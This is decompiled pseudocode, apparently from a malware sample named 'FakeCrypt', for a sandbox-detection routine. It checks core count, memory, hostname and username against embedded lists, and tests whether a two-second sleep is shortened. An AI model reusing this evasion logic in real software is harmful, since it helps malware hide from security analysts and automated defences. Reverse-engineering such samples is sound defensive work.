
  fn FakeCrypt::stealth::is_sandbox::hafd329d2780dcab4() -> u64

{
    let mut var_1d0: ();
    sysinfo::common::System::new_all::hc9da36646fff1f13(&var_1d0);
    let mut rax: i8;
    let mut rdx: i64;
    rax = sysinfo::common::System::physical_core_count::hdbb8393c4be371fb();
    let mut rbx: i32;
    rbx = 1;
    let var_68: i64;
    
    if (rax & 1) != 0 && rdx >= 2 && var_68 >= 0x200000
    {
        let mut var_218: *mut *mut c_void;
        hostname::get::h3b1635af47d30924(&var_218);
        let mut var_200: ();
        core::result::Result$LT$T$C$E$GT$::unwrap_or_default::hf494175ec33b8dd0(&var_200, &var_218);
        let var_1f8: i64;
        let var_1f0: u64;
        alloc::string::String::from_utf8_lossy::h6007208a5a0b939d(&var_218, var_1f8, var_1f0);
        let var_210: *mut i8;
        let var_208: u64;
        let mut var_1e8: ();
        alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::ha0815f2983b5f9c9(&var_1e8, var_210, 
            var_208);
        core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::h422f01b5a2867946(&var_218);
        core::ptr::drop_in_place$LT$std..ffi..os_str..OsString$GT$::h7a05ee20b892fddb(&var_200);
        var_218 = &data_4d91f0;
        let var_210_1: *mut *mut [i8; 0x147] = &data_4d9230;
        
        if _$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::any::h26f2523e8bc586fa(&var_218, &var_1e8) != 0
        {
            rbx = 1;
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha63171d2b15b0f17(&var_1e8);
        }
        else
        {
            whoami::api::username::h560cc38fa776b431(&var_218);
            alloc::str::_$LT$impl$u20$str$GT$::to_lowercase::ha0815f2983b5f9c9(&var_200, var_210_1, 
                var_208);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha63171d2b15b0f17(&var_218);
            var_218 = &data_4d9230;
            let mut var_210_2: *mut *mut [i8; 0x13b] = &data_4d9260;
            let rax_2: i8 = _$LT$core..slice..iter..Iter$LT$T$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::any::h26f2523e8bc586fa(&var_218, &var_200);
            let mut rax_4: i64;
            
            if rax_2 == 0
            {
                let mut rax_3: *mut *mut c_void;
                let mut rdx_4: i32;
                rax_3 = std::time::Instant::now::h2e7a0929984309fc();
                var_218 = rax_3;
                var_210_2 = rdx_4;
                std::thread::sleep::h542b9c721528a25a(2, 0);
                rax_4 = std::time::Instant::elapsed::h3ed9b8e557e470d7(&var_218);
            }
            
            if rax_2 == 0 && rax_4 >= 2
            {
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha63171d2b15b0f17(&var_200);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha63171d2b15b0f17(&var_1e8);
                rbx = 0;
            }
            else
            {
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha63171d2b15b0f17(&var_200);
                rbx = 1;
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::ha63171d2b15b0f17(&var_1e8);
            }
        }
    }
    
    core::ptr::drop_in_place$LT$sysinfo..common..System$GT$::hc8fe3377c4e9e53b(&var_1d0);
    rbx
}
